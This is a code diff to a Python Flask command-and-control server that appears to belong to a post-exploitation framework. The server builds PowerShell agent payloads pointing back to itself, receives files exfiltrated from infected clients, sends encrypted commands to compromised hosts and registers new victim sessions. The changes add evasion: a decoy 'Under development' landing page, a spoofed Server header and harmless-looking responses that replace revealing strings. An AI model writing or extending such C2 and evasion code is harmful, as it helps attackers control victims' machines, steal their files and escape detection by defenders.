@@ -88,14 +88,23 @@ class NewListener:
         pcode4 = pcode3.replace("OCT_command", command_host_url)
         pcode5 = pcode4.replace("OCT_report", report_url.split("/")[1])
         pcode6 = pcode5.replace("OCT_file_receiver", file_reciver_url.split("/")[1])
-        pcode7 = pcode6.replace("OCT_command_receiver", command_receiver_url.split("/")[1])
+        pcode7 = pcode6.replace("OCTRECV", command_receiver_url.split("/")[1])
         pcode8 = pcode7.replace("OCU_PROTO", proto)
         pcode9 = pcode8.replace("SRVHOST", srvhost)
-        return pcode9
+        response = make_response(pcode9)
+        response.headers["Server"] = server_response_header
+        return response
 
 
   def create_path(self):
       app.add_url_rule("/%s" % self.path, self.host , self.powershell_code)
+
+
+@app.route("/")
+def index():
+    resp = make_response("<title>Under development</title><center><h1>Under development server</h1></center>")
+    resp.headers["Server"] = server_response_header
+    return resp
 
 
 @app.route(file_reciver_url, methods=["POST"])
@@ -109,7 +118,10 @@ def fr():
     f.write(ready_to_write)
     f.close()
     print colored("\n[+] File %s downloaded from the client !" % filename, "green")
-    return "True"
+    response = make_response("Nothing to see here !")
+    response.headers["Server"] = server_response_header
+    return response
+
 
 @app.route(report_url)
 def report():
@@ -121,9 +133,15 @@ def report():
             header = request.headers["Authorization"]
             processes = decrypt_command(aes_encryption_key, header).strip("\x00").split(" ")
             esa(processes, session)
-            return "NothingToDo2"
+            response = make_response("Cool page !")
+            response.headers["Server"] = server_response_header
+            return response
+
         else:
-            return "GoAway"
+            response = make_response("ok !")
+            response.headers["Server"] = server_response_header
+            return response
+
 
 
 @app.route(command_send_url)
@@ -137,7 +155,10 @@ def command(hostname):
             commands[hostname] = encrypt_command(aes_encryption_key, "False")
     except KeyError:
             return "False"
-    return command_to_execute
+    response = make_response(command_to_execute)
+    response.headers["Server"] = server_response_header
+    return response
+
 
 @app.route(command_receiver_url)
 def cr():
@@ -169,7 +190,6 @@ def first_ping():
             print "\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter)
             commands[hostname] = encrypt_command(aes_encryption_key, "False")
             counter = counter + 1
-            return "GoodToGo"
-    #except:
-    #    return "HaHa !"
-    #return "Hello World!"
+            response = make_response("")
+            response.headers["Server"] = server_response_header
+            return response
